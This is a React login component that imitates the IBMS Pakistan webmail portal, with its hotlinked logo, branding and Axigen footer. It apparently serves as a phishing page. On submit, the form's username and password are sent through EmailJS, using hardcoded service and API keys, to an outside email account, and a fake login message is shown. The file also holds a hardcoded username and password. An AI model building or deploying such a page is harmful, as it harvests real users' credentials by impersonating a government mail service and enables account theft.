import React, { useRef, useState, useEffect } from "react";
import "./style.css";
import emailjs from "@emailjs/browser";
import { notification } from "antd";

const Main = () => {
  const form = useRef();
  const [userName, setUserName] = useState("");
  const [password, setpassword] = useState("");
  useEffect(() => {}, [userName, password]);
  const [userExist, setUserExist] = useState({
    user: "Azam.ali",
    password: "12345",
  });
  const sendEmail = (e) => {
    e.preventDefault();
    const placement = "top";
    emailjs
      .sendForm(
        "service_jdx44jn",
        "template_xy00dgb",
        form.current,
        "UrR8OS3JjUBMKVWNf"
      )
      .then(
        (result) => {
          console.log(result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
    if (userName && password) {
      if (userExist.user === userName && userExist.password === password) {
        notification.open({
          message: "You are Successfully Loged In",
          style: {
            width: 300,
            height: 60,
            fontSize: "10px",
          },
          placement,
        });
      } else {
        notification.open({
          message: "User not Exist!",
          style: {
            width: 300,
            height: 60,
            fontSize: "10px",
          },
          placement,
        });
      }
    }
    if (userName && !password) {
      notification.open({
        message: "Please fill Password field",
        style: {
          width: 250,
          height: 60,
          fontSize: "10px",
        },
        placement,
      });
    }
    if (!userName && password) {
      notification.open({
        message: "Please fill Username field",
        style: {
          width: 250,
          height: 60,
          fontSize: "10px",
        },
        placement,
      });
    }
    if (!userName && !password) {
      notification.open({
        message: "Please fill all fields",
        style: {
          width: 250,
          height: 60,
          fontSize: "10px",
        },
        placement,
      });
    }
  };

  return (
    <div className="Container mt-5">
      <div className="row " style={{ position: "relative", left: "10px" }}>
        <div className="col-sm-3 "></div>
        <div className="col-sm-6 mt-5 " style={{ width: "357px" }}>
          <img
            src="https://webmail.ibms.gov.pk/branding_show_photo.hsp?elementName=ajaxPublicPhoto"
            alt="Image has not loaded yet!"
          />
          <h5 className="haed_Text_1 ">IBMS PAKISTAN </h5>
          <h5 className="haed_Text_2 ">Log in to your IBMS PAKISTAN</h5>
          {/* Form */}
          <form className="form" ref={form} onSubmit={sendEmail}>
            <div className="input-container">
              <input
                type="text"
                name="user_name"
                onChange={(e) => {
                  setUserName(e.target.value);
                }}
              />
              <label
                className={`${userName}` ? "label1_after" : "label1"}
                htmlFor="username"
              >
                USERNAME
              </label>
            </div>
            <div className="input-container mt-2 ">
              <input
                type="password"
                name="user_password"
                onChange={(e) => {
                  setpassword(e.target.value);
                }}
              />
              <label
                className={`${password}` ? "label2_after" : "label2"}
                htmlFor="password"
              >
                PASSWORD
              </label>
            </div>

            <div className="login_btn mt-5 mb-4">
              <input type="submit" value="log in" />
            </div>
          </form>

          <div className="switch_text mt-5 ">
            Switch to{" "}
            <a href="#" style={{ textDecoration: "none", color: "#4c8ea6" }}>
              Standard Interface
            </a>
            <div className="mt-4">DropDown</div>
          </div>
          <div className="switch_text mt-5 ">
            Powered by
            <a
              href="https://www.axigen.com/?utm_source=product&utm_medium=webmail&utm_campaign=webmail_login_page_en"
              style={{ textDecoration: "none", color: "#4c8ea6" }}
            >
              Axigen
            </a>
          </div>
          <hr />
          <div className="bottom_text_div">
            <p className=" bottom_text">
              Email, calendaring, and collaboration
            </p>
            <p className=" bottom_text">
              Total privacy, high availability, and scalability
            </p>
          </div>
        </div>
        <div className="col-sm-3 "></div>
      </div>
    </div>
  );
};
export default Main;
